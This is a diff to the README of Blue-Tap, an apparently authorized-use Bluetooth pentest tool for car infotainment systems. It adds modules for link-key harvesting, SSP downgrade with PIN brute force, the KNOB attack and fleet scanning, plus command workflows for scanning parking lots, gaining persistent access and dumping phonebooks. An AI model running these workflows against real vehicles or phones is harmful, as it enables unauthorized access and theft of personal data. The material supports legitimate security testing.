@@ -134,10 +134,10 @@ Blue-Tap is designed exclusively for **authorized security testing**. You must h
 │  │  │CapturInj │ │ Vol Ramp │ │   vCard  │ │  10135   │ │  Flood   │     │ │
 │  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
 │  │                                                                         │ │
-│  │  ┌──────────┐ ┌──────────┐                                              │ │
-│  │  │BlueSnarfr│ │ PIN Brute│                                              │ │
-│  │  │ AT Cmds  │ │ Legacy   │                                              │ │
-│  │  └──────────┘ └──────────┘                                              │ │
+│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
+│  │  │BlueSnarfr│ │SSP Downgr│ │  KNOB    │ │Key Harvst│ │  Fleet   │     │ │
+│  │  │ AT Cmds  │ │Force PIN │ │CVE-9506  │ │Link Keys │ │Multi-Dev │     │ │
+│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
 │  └─────────────────────────────────────────────────────────────────────────┘ │
 │                                                                              │
 │  ┌─────────────────────────────────────────────────────────────────────────┐ │
@@ -171,6 +171,11 @@ Blue-Tap is designed exclusively for **authorized security testing**. You must h
 │  │  │ Field/Int/Length  │ │  Field reducer   │  │  Mutation replay │    │   │ │
 │  │  │ Protocol/Corpus  │ └──────────────────┘  └──────────────────┘    │   │ │
 │  │  └──────────────────┘                                               │   │ │
+│  │                                                                     │   │ │
+│  │  ┌──────────── Fuzzing Intelligence (Phase 1-6) ─────────────────┐  │   │ │
+│  │  │ State Inference │ Field Weights │ Response Analyzer │ Health   │  │   │ │
+│  │  │ (AFLNet IPSM)   │ (BrakTooth)   │ Struct+Time+Leak  │ Monitor  │  │   │ │
+│  │  └────────────────────────────────────────────────────────────────┘  │   │ │
 │  └─────────────────────────────────────────────────────────────────────┘   │ │
 │                                                                              │
 │  ┌──────────────────────────────┐                                           │
@@ -264,29 +269,37 @@ cli.py ────────────────────────�
   │   └── hci_capture.py  ← btmon
   │
   ├── attack/
-  │   ├── vuln_scanner.py ← recon/* (SDP, RFCOMM, fingerprint)
-  │   ├── hijack.py       ← spoofer + pbap + map + hfp
-  │   ├── pbap.py         ← socket(RFCOMM) + OBEX binary
-  │   ├── map_client.py   ← socket(RFCOMM) + OBEX binary
-  │   ├── hfp.py          ← socket(RFCOMM) + AT commands + SCO
-  │   ├── a2dp.py         ← PulseAudio (pulsectl)
-  │   ├── avrcp.py        ← D-Bus (BlueZ AVRCP interface)
-  │   ├── bias.py         ← L2CAP role-switch manipulation
-  │   ├── bluesnarfer.py  ← socket(RFCOMM) + AT commands
-  │   ├── dos.py          ← pairing flood, l2ping, name flood
-  │   ├── opp.py          ← socket(RFCOMM) + OBEX Push
-  │   └── pin_brute.py    ← D-Bus pairing agent
+  │   ├── vuln_scanner.py  ← recon/* (SDP, RFCOMM, fingerprint)
+  │   ├── hijack.py        ← spoofer + pbap + map + hfp
+  │   ├── pbap.py          ← socket(RFCOMM) + OBEX binary
+  │   ├── map_client.py    ← socket(RFCOMM) + OBEX binary
+  │   ├── hfp.py           ← socket(RFCOMM) + AT commands + SCO
+  │   ├── a2dp.py          ← PulseAudio (pulsectl)
+  │   ├── avrcp.py         ← D-Bus via dbus-fast (async)
+  │   ├── bias.py          ← L2CAP role-switch manipulation
+  │   ├── bluesnarfer.py   ← socket(RFCOMM) + AT commands
+  │   ├── dos.py           ← pairing flood, l2ping, name flood
+  │   ├── opp.py           ← socket(RFCOMM) + OBEX Push
+  │   ├── pin_brute.py     ← D-Bus pairing agent
+  │   ├── key_harvest.py   ← HCI capture + link key extraction + key DB
+  │   ├── ssp_downgrade.py ← IO cap manipulation + PIN brute force
+  │   ├── knob.py          ← CVE-2019-9506 key negotiation + brute force
+  │   └── fleet.py         ← device classification + fleet-wide vuln scan
   │
   ├── fuzz/
-  │   ├── engine.py       ← transport + crash_db + corpus + mutators
-  │   ├── transport.py    ← L2CAP/RFCOMM/BLE socket abstractions
-  │   ├── crash_db.py     ← SQLite3
-  │   ├── corpus.py       ← protocol-tagged seed storage
-  │   ├── mutators.py     ← field/integer/length/corpus mutation
-  │   ├── minimizer.py    ← binary search + ddmin + field reduction
-  │   ├── pcap_replay.py  ← btsnoop v1 parser + replay engine
-  │   ├── protocols/      ← 8 protocol-specific builders
-  │   └── strategies/     ← 4 campaign strategies
+  │   ├── engine.py              ← campaign orchestrator + main loop
+  │   ├── transport.py           ← L2CAP/RFCOMM/BLE socket abstractions
+  │   ├── crash_db.py            ← SQLite crash storage + dedup
+  │   ├── corpus.py              ← protocol-tagged seed management
+  │   ├── mutators.py            ← field/integer/length/corpus mutation
+  │   ├── minimizer.py           ← binary search + ddmin + field reduction
+  │   ├── pcap_replay.py         ← btsnoop v1 parser + replay engine
+  │   ├── state_inference.py     ← AFLNet-adapted protocol state graph
+  │   ├── field_weight_tracker.py← anomaly-guided field mutation weights
+  │   ├── response_analyzer.py   ← 3-layer anomaly detection (struct+time+leak)
+  │   ├── health_monitor.py      ← watchdog reboot + degradation detection
+  │   ├── protocols/             ← 8 protocol-specific builders
+  │   └── strategies/            ← 4 campaign strategies
   │
   ├── report/
   │   └── generator.py    ← session data → HTML/JSON reports
@@ -1222,6 +1235,54 @@ report
 
 ```bash
 blue-tap -s auto-pentest run --playbook ivi-pentest.txt
+```
+
+### Workflow 6: Fleet-Wide Assessment
+
+Assess all IVIs in a parking lot or fleet.
+
+```bash
+# Scan and classify all nearby devices
+blue-tap fleet scan -d 30
+
+# Assess all discovered IVIs
+blue-tap fleet assess
+
+# Generate consolidated fleet report
+blue-tap fleet report -o fleet_report.html
+```
+
+### Workflow 7: Persistent Access via Link Key
+
+Demonstrate that a single intercepted pairing gives indefinite access.
+
+```bash
+# Step 1: Capture a pairing exchange (run while target pairs)
+blue-tap keys harvest AA:BB:CC:DD:EE:FF -d 600
+
+# Step 2: Verify the key works
+blue-tap keys verify AA:BB:CC:DD:EE:FF
+
+# Step 3: Days/weeks later — reconnect without re-pairing
+blue-tap keys reconnect AA:BB:CC:DD:EE:FF
+
+# Step 4: Extract data using the persistent connection
+blue-tap pbap dump AA:BB:CC:DD:EE:FF
+```
+
+### Workflow 8: SSP Downgrade + PIN Brute Force
+
+Force a device from Secure Simple Pairing to legacy PIN mode.
+
+```bash
+# Check if the target is vulnerable
+blue-tap ssp-downgrade probe AA:BB:CC:DD:EE:FF
+
+# Execute the downgrade + brute force
+blue-tap ssp-downgrade attack AA:BB:CC:DD:EE:FF
+
+# Once paired, extract data
+blue-tap pbap dump AA:BB:CC:DD:EE:FF
 ```
 
 ### Workflow 6: Audio Eavesdropping
